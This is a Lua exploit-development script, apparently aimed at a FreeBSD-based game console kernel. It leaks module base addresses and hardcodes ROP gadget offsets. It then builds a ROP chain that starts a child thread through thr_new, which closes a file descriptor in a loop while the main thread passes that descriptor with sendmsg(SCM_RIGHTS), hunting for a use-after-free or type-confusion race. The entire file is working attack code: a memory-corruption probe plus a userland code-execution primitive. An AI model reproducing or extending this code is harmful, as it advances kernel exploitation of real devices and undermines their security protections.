-- CRASH_CLASS: MODERATE
-- PROBE 534a: fd-close race between main and child thread
--
-- Race: main thread sendmsg(SCM_RIGHTS, fd) while child thread close(fd)
-- If close() races with the fd lookup in sendmsg, we might get:
-- a) Use-after-free on the file object
-- b) Type confusion if the fd slot is reused
-- c) Kernel panic (which tells us the race exists)
--
-- Uses: socketpair for SCM_RIGHTS (confirmed 526a), thr_new for child.
-- Child thread does: sleep briefly, then close(target_fd) in a loop.
-- Main thread does: sendmsg(SCM_RIGHTS, target_fd) in a loop.
-- The target_fd is a socketpair fd — it has kernel refcounting.
--
-- Strategy: 200 iterations, check for anomalies.

print("=== PROBE 534a: FD CLOSE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_socketpair = make_syscall(135)
local sc_sendmsg = make_syscall(28)
local sc_recvmsg = make_syscall(27)
local sc_close = make_syscall(6)
local sc_nanosleep = make_syscall(240)
local sc_455 = make_syscall(455)
local sc_431 = make_syscall(431)

-- Get eboot base
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb))

-- Get libkernel base
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("lk=" .. q(lk))

-- Gadgets
local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local pop_rsi_ret = eb + uint64(0xD77D)
local pop_rdx_ret = eb + uint64(0x3B02D7)
local bare_ret = eb + uint64(0x42)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local fn_addr = lk + uint64(0xB57)  -- syscall; ret

-- Create transport socketpair (for SCM_RIGHTS)
local sv_transport = memory.alloc(8)
zero(sv_transport, 8)
pcall(function()
    sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv_transport))
end)
local tx_fd = rd(sv_transport)
local rx_fd = rd(sv_transport + 4)
print("transport: tx=" .. (tx_fd or "nil") .. " rx=" .. (rx_fd or "nil"))

-- Create target fd (this is what we race on)
local sv_target = memory.alloc(8)
zero(sv_target, 8)
pcall(function()
    sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv_target))
end)
local target_fd = rd(sv_target)
local target_peer = rd(sv_target + 4)
print("target: fd=" .. (target_fd or "nil") .. " peer=" .. (target_peer or "nil"))

-- Shared memory for results
local shared = memory.alloc(0x100)
zero(shared, 0x100)
-- shared+0: child close count
-- shared+4: child errno samples (first 10)
-- shared+0x40: status flag (0=run, 1=stop)

-- Build child ROP chain: close(target_fd) in a loop
-- Child: sysarch(SET_FSBASE) → loop { close(target_fd); increment counter } → thr_exit
local stack_size = 0x40000
local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(stack_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

-- Fake TCB for child
local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for toff = 0, 0x100, 8 do wq(tcb_page + toff, tcb_page) end
local tcb_ptr = memory.alloc(8); wq(tcb_ptr, tcb_page)

-- The child just does close(target_fd) 200 times then exits
-- Simple linear chain: no loops in ROP
-- Each close: pop_rax(6), pop_rdi(target_fd), syscall;ret, store rv → shared
local chain_start = stack_base + stack_size - 0x8000
local i = 0
local function emit(v) wq(chain_start + i, v); i = i + 8 end

-- sysarch(SET_FSBASE=129, tcb_ptr)
emit(pop_rax_ret); emit(uint64(165))
emit(pop_rdi_ret); emit(uint64(129))
emit(pop_rsi_ret); emit(tcb_ptr)
emit(fn_addr)

-- 200 close(target_fd) calls
local ITERS = 200
for iter = 0, ITERS - 1 do
    emit(pop_rax_ret); emit(uint64(6))    -- close
    emit(pop_rdi_ret); emit(uint64(target_fd))
    emit(fn_addr)
    -- store rv to shared + 4 + iter*4 (first 10 only to save space)
    if iter < 10 then
        emit(pop_rdi_ret); emit(shared + 4 + iter * 4)
        emit(mov_rdi_rax_ret)
    end
end

-- Store iteration count
emit(pop_rax_ret); emit(uint64(ITERS))
emit(pop_rdi_ret); emit(shared)
emit(mov_rdi_rax_ret)

-- thr_exit
emit(pop_rax_ret); emit(uint64(431))
emit(pop_rdi_ret); emit(uint64(0))
emit(fn_addr)

-- RSP for child
local child_rsp = chain_start

-- thr_param for thr_new(455)
local thr_param = memory.alloc(0x40)
zero(thr_param, 0x40)
wq(thr_param, pop_rax_ret)          -- start_func = first gadget
wq(thr_param + 8, uint64(0))        -- arg (unused, entry via ROP)
wq(thr_param + 0x10, stack_base)    -- stack_base
wq(thr_param + 0x18, uint64(stack_size))  -- stack_size

-- Overwrite start_func to point to our chain entry
-- thr_new calls start_func(arg) — but arg is in rdi, and we need
-- RIP to point to our chain. The issue: thr_new sets RIP=start_func,
-- RSP=stack_top. We need RSP=chain_start.
-- Solution: start_func = pop_rax_ret (first instruction of our chain)
-- but RSP will be at stack_top, not chain_start.
-- We need the chain AT stack_top.
-- Recalculate: put chain at the top of the stack

-- Actually thr_new sets RSP = (stack_base + stack_size) & ~0xF - 8
-- and pushes return address. But start_func is called directly.
-- RSP will be at the top of stack. We need our chain there.

-- Redo: put the chain at the aligned RSP position
local aligned_rsp = math.floor((to_num(stack_base) + stack_size) / 16) * 16 - 8
-- When thr_new calls start_func(arg):
-- RIP = start_func, RSP = aligned_rsp
-- start_func = pop_rax_ret → pops from [RSP], RSP += 8
-- So the chain data starts at aligned_rsp

-- Rewrite chain at aligned_rsp
i = 0
local chain_base = uint64(aligned_rsp)
local function emit2(v) wq(chain_base + i, v); i = i + 8 end

-- First thing popped by pop_rax_ret (which is start_func):
emit2(uint64(165))  -- rax = 165 (sysarch)
emit2(pop_rdi_ret); emit2(uint64(129))
emit2(pop_rsi_ret); emit2(tcb_ptr)
emit2(fn_addr)

for iter = 0, ITERS - 1 do
    emit2(pop_rax_ret); emit2(uint64(6))
    emit2(pop_rdi_ret); emit2(uint64(target_fd))
    emit2(fn_addr)
    if iter < 10 then
        emit2(pop_rdi_ret); emit2(shared + 4 + iter * 4)
        emit2(mov_rdi_rax_ret)
    end
end

emit2(pop_rax_ret); emit2(uint64(ITERS))
emit2(pop_rdi_ret); emit2(shared)
emit2(mov_rdi_rax_ret)

emit2(pop_rax_ret); emit2(uint64(431))
emit2(pop_rdi_ret); emit2(uint64(0))
emit2(fn_addr)

-- Update thr_param
wq(thr_param, pop_rax_ret)          -- start_func
wq(thr_param + 0x10, stack_base)    -- stack_base
wq(thr_param + 0x18, uint64(stack_size))

-- child_tid output
local child_tid = memory.alloc(8)
wq(child_tid, uint64(0))
wq(thr_param + 0x30, uint64(child_tid))  -- child_tid ptr

print("")
print("[START] Launching child + main thread race")

-- Launch child
local ok_thr, thr_rv = pcall(function()
    return sc_455(uint64(thr_param), uint64(0x38))
end)
print("thr_new rv=" .. to_num(thr_rv))

-- Main thread: sendmsg(SCM_RIGHTS, target_fd) in a tight loop
-- Build sendmsg structures
local iov_data = memory.alloc(8)
wq(iov_data, uint64(0x41))  -- 1 byte payload

local iov_struct = memory.alloc(16)
wq(iov_struct, uint64(iov_data))
wq(iov_struct + 8, uint64(1))

-- cmsg: SCM_RIGHTS with target_fd
-- cmsg_len = 16 + 4 = 20 (CMSG_LEN for 1 fd)
-- But aligned: CMSG_SPACE = 24
local cmsg_buf = memory.alloc(32)
zero(cmsg_buf, 32)
wd(cmsg_buf, 20)        -- cmsg_len = sizeof(cmsghdr) + sizeof(int) = 12+4=16...
-- Actually on FreeBSD amd64: sizeof(cmsghdr) = 12 (len:4, level:4, type:4)
-- cmsg_len for 1 fd = 12 + 4 = 16
wd(cmsg_buf, 16)        -- cmsg_len
wd(cmsg_buf + 4, 0xFFFF) -- SOL_SOCKET = 0xFFFF
wd(cmsg_buf + 8, 1)     -- SCM_RIGHTS = 1
wd(cmsg_buf + 12, target_fd) -- the fd

local msghdr = memory.alloc(64)
zero(msghdr, 64)
-- msg_name = NULL (0), msg_namelen = 0
wq(msghdr + 0x10, uint64(iov_struct))  -- msg_iov
wd(msghdr + 0x18, 1)                    -- msg_iovlen
wq(msghdr + 0x20, uint64(cmsg_buf))    -- msg_control
wd(msghdr + 0x28, 24)                   -- msg_controllen (CMSG_SPACE(4))

local send_ok = 0
local send_fail = 0
local send_ebadf = 0

for iter = 1, ITERS do
    -- Refresh the fd in cmsg (in case it was corrupted)
    wd(cmsg_buf + 12, target_fd)

    local ok_s, srv = pcall(function()
        return sc_sendmsg(uint64(tx_fd), uint64(msghdr), uint64(0))
    end)
    local srvn = ok_s and to_num(srv) or -999

    if srvn >= 0 then
        send_ok = send_ok + 1
        -- Drain the received message
        local recv_cmsg = memory.alloc(32)
        zero(recv_cmsg, 32)
        local recv_iov_data = memory.alloc(8)
        local recv_iov = memory.alloc(16)
        wq(recv_iov, uint64(recv_iov_data))
        wq(recv_iov + 8, uint64(8))
        local recv_mh = memory.alloc(64)
        zero(recv_mh, 64)
        wq(recv_mh + 0x10, uint64(recv_iov))
        wd(recv_mh + 0x18, 1)
        wq(recv_mh + 0x20, uint64(recv_cmsg))
        wd(recv_mh + 0x28, 32)
        pcall(function() sc_recvmsg(uint64(rx_fd), uint64(recv_mh), uint64(0)) end)

        -- Check received fd
        local recv_fd = rd(recv_cmsg + 12)
        if recv_fd and recv_fd ~= target_fd and recv_fd > 0 then
            print(string.format("  *** ANOMALY iter %d: sent fd %d, received fd %d ***",
                iter, target_fd, recv_fd))
        end

        -- Close received fd to avoid fd leak
        if recv_fd and recv_fd > 0 then
            pcall(function() sc_close(uint64(recv_fd)) end)
        end
    else
        send_fail = send_fail + 1
        -- EBADF = 9
        if srvn == -1 then send_ebadf = send_ebadf + 1 end
    end
end

-- Wait for child to finish
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, uint64(500000000))
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

-- Read child results
local child_iters = rd(shared)
print("")
print("[RESULTS]")
print("  main: send_ok=" .. send_ok .. " send_fail=" .. send_fail .. " send_ebadf=" .. send_ebadf)
print("  child: close_iters=" .. (child_iters or "nil"))

-- Print child close return values (first 10)
local close_rvs = ""
for j = 0, 9 do
    local crv = rd(shared + 4 + j * 4)
    if crv then
        if crv < 0 then crv = crv + 0x100000000 end
        close_rvs = close_rvs .. string.format("%X ", crv)
    end
end
print("  child_close_rvs: " .. close_rvs)

-- Cleanup
pcall(function() sc_close(uint64(tx_fd)) end)
pcall(function() sc_close(uint64(rx_fd)) end)
pcall(function() sc_close(uint64(target_peer)) end)
-- target_fd might already be closed by child

print("")
print("=== 534a DONE ===")
